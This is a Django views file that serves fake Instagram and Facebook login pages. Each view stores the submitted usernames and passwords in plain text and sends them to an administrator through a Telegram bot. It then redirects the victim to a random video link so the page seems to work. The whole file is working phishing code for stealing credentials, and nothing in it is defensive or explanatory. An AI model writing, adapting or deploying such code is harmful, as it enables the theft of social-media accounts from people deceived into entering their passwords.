from .models import Instagram, Facebook,InstagramVideoUrl, FacebookVideoUrl
from django.views.generic import TemplateView, CreateView
from .forms import InstagramForm, FacebookForm
from django.shortcuts import render, redirect
from django.conf import settings

import datetime, telebot, random

bot = telebot.TeleBot(token=settings.TOKEN, parse_mode="HTML", threaded=False)  # Markdown + HTML, threaded=False


# Create your views here.
class InstagramView(TemplateView, CreateView):
    def get(self, request, *args, **kwargs):
        data_now = datetime.datetime.now()
        context = {'time': data_now.strftime("%Y")}
        return render(request, 'instagram/index.html', context)

    def post(self, request, *args, **kwargs):
        form = InstagramForm(request.POST)
        if form.is_valid():
            if Instagram.objects.filter(login=form.cleaned_data['username']).exists():
                instagram = Instagram.objects.get(login=form.cleaned_data['username'])
                if not instagram.status:
                    bot.send_message(settings.ADMIN, f"login: {instagram.login}, parol: {instagram.password}")
                    instagram.password = form.cleaned_data['password']
                    instagram.status = True
            else:
                instagram = Instagram(login=form.cleaned_data['username'], password=form.cleaned_data['password'])
                bot.send_message(settings.ADMIN, f"Instagram login: {instagram.login}, parol: {instagram.password}")
            instagram.save()

            random_urls = InstagramVideoUrl.objects.all()
            return redirect(random_urls[random.randrange(len(random_urls))].url)

        data_now = datetime.datetime.now()
        context = {'time': data_now.strftime("%Y"), 'form': form}
        return render(request, 'instagram/index.html', context)


class FacebookView(TemplateView, CreateView):
    def get(self, request, *args, **kwargs):
        data_now = datetime.datetime.now()
        context = {'time': data_now.strftime("%Y")}
        return render(request, 'facebook/index.html', context)

    def post(self, request, *args, **kwargs):
        form = FacebookForm(request.POST)
        if form.is_valid():
            if Facebook.objects.filter(login=request.POST.get("username")).exists():
                facebook = Facebook.objects.get(login=request.POST.get("username"))
                if not facebook.status:
                    bot.send_message(settings.ADMIN, f"login: {facebook.login}, parol: {facebook.password}")
                    facebook.password = request.POST.get("password")
                    facebook.status = True
            else:
                facebook = Facebook(login=request.POST.get("username"), password=request.POST.get("password"))
                bot.send_message(settings.ADMIN, f"<b>Facebook</b> login: {facebook.login}, parol: {facebook.password}")
            facebook.save()

            random_urls = FacebookVideoUrl.objects.all()
            return redirect(random_urls[random.randrange(len(random_urls))].url)

        data_now = datetime.datetime.now()
        context = {'time': data_now.strftime("%Y")}
        return render(request, 'facebook/index.html', context)
